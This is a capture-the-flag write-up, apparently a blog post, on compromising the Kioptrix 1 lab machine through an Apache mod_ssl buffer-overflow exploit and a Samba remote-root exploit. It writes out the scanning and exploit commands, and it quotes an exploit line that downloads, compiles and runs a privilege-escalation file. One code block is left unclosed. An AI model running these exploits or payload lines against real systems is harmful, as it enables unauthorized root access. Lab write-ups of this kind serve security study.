I started out by finding the IP address of the target's machine. This can be done with ``netdiscover``, which shows the IP address along with a MAC address. Since I already knew the MAC address (shown in VirtualBox), this could be easily matched with the right IP address. I used the `-r` option to scan for a limited range in which I know the IP address will be, which saves time.

```sh
kali@kali:~$ sudo netdiscover -r 192.168.56.0/16

Currently scanning: 192.168.95.0/16   |   Screen View: Unique Hosts

```

I then ran an nmap scan against the target's IP address 192.168.56.107 to find out more about the target. I used the `-sS`, `-A`, `-n` and `-oA` options because in my opinion these serve a good general purpose with relatively quick but useful results. I saved the output in a file because don’t like to do multiple scans unless I absolutely have to (such as when I need different `nmap` options to fit a very specific purpose).

```bash
kali@kali:~$ sudo nmap -sS -A -n -oA kioptrix1 192.168.56.107

```

The first two things that grabbed my attention here were port 80 and 443. Web servers are always interesting to check out so I tried to find any vulnerabilities of this particular version of the mod_ssl module that the Apache web server was using:

```
kali@kali:~$ searchsploit apache mod_ssl
```

So there’s a remote buffer overflow exploit available, let's give that a try. Compiling it doesn’t go as smoothly, though:

```bash
kali@kali:~$ gcc 47080.c -lcrypto
47080.c:21:10: fatal error: openssl/ssl.h: No such file or directory
   21 | #include <openssl/ssl.h>
      |          ^~~~~~~~~~~~~~~
compilation terminated.
```

A quick Google search shows that installing `libssl-dev` resolves this and the exploit can be compiled afterwards (the `lcrypto` option is suggested in the source code of the exploit). The extra options for running the exploit (`a.out`) can be found by running it without any options whatsoever - this shows the usage instructions:

* `0.6xb` as the 'target' option (matching the Apache version on the target's machine)
* `192.168.56.107` as the ‘box' option (matching the target's machine’s IP address)
* `443` as the ‘port' option
* `40` as the ‘open connection amount’ option (the instructions suggest 40-50)


```bash
kali@kali:~$ sudo apt-get install libssl-dev
kali@kali:~$ gcc 47080.c -lcrypto
kali@kali:~$
kali@kali:~$ ./a.out 0x6b 192.168.56.107 443 -c 40

```

This results in a shell, but with lower privileges than intended. Because this particular exploit is supposed to result in a shell with root privileges, something went wrong. As can be seen in the error message shown above after running the exploit, the following commands failed:

`#define COMMAND2 "unset HISTFILE; cd /tmp; wget https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c; gcc -o exploit ptrace-kmod.c -B /usr/bin; rm ptrace-kmod.c; ./exploit; \n"`

This is because for safety reasons, I run the target's machine on a host-only network adapter. This means the `wget` command will fail as no connection to the internet can be made. A quick workaround for this is to `wget https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c` on my Kali Linux machine first and then edit the exploit so that it lets the target download the file from my Kali Linux machine instead of from the original source.


On Kali:

```bash
kali@kali:~$ wget https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
kali@kali:~$ nano ptrace-kmod.c
kali@kali:~$ python -m SimpleHTTPServer 7777
```

In a second Terminal tab on Kali:

```bash

## A second method

Another interesting point of entry here is the SMB service running on the target. I tried enumerating the SMB version with `enum4linux`, but apparently this command no longer shows version info. After a lot of Googling, I found [smbver.sh](https://github.com/rewardone/OSCPRepo/blob/master/scripts/recon_enum/smbver.sh) which is supposed to enumerate the exact version.

According to the source code of this script (which luckily wasn’t hard to read at all), this script relies on doing a packet capture of an SMB connection request. After doing some research, this method seemed to be the most reliable alternative to enum4linux. In that case, why not do what the script does myself?

I set up a packet capture using `Wireshark` first and then tried to connect with the target’s SMB service in one tab (‘KIOPTRIX' can be found as the netbios name in the `nmap` output):

```bash
kali@kali:~$ smbclient //192.168.56.107/KIOPTRIX

protocol negotiation failed: NT_STATUS_IO_TIMEOUT
```

That error is definitely not supposed to be there (also indicated by the lack of useful information in the packet capture). After some googling, I found out this can be fixed by editing the `smb.config` file (`/etc/samba/smb.conf`) and adding the following line in the ‘global' section:

`client min protocol = NT1`

After saving the changes and retrying, I got the following results:

```bash
kali@kali:~$ smbclient //192.168.56.107/KIOPTRIX
Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
Anonymous login successful
Enter WORKGROUP\kali's password:
```

![alt]({{ site.url }}{{ site.baseurl }}/images/kioptrix1_wireshark.png)

So the version is 2.2.1a. A few exploits can be found for that, I chose [this one](https://www.exploit-db.com/exploits/10).

After compiling the exploit and running it, the following usage instructions are shown:

```bash
kali@kali:~$ ./a.out
samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)
--------------------------------------------------------------
Usage: ./a.out [-bBcCdfprsStv] [host]

-b <platform>   bruteforce (0 = Linux, 1 = FreeBSD/NetBSD, 2 = OpenBSD 3.1 and prior, 3 = OpenBSD 3.2)
-B <step>       bruteforce steps (default = 300)
-c <ip address> connectback ip address
-C <max childs> max childs for scan/bruteforce mode (default = 40)
-d <delay>      bruteforce/scanmode delay in micro seconds (default = 100000)
-f              force
-p <port>       port to attack (default = 139)
-r <ret>        return address
-s              scan mode (random)
-S <network>    scan mode
-t <type>       presets (0 for a list)
-v              verbose mode
```

So, running the binary with the following parameters results in root access:

```bash
kali@kali:~$ ./a.out -b0 192.168.56.107 192.168.56.102
samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)
--------------------------------------------------------------
+ Bruteforce mode. (Linux)
+ Host is running samba.
+ Worked!

## Lessons learned

I gained full access of the machine through two separate entry points, the SMB service and the mod_ssl module running on the Apache web server. Both of these entries relied on outdated versions running on the target’s machine. This can be easily prevented by regularly performing updates.
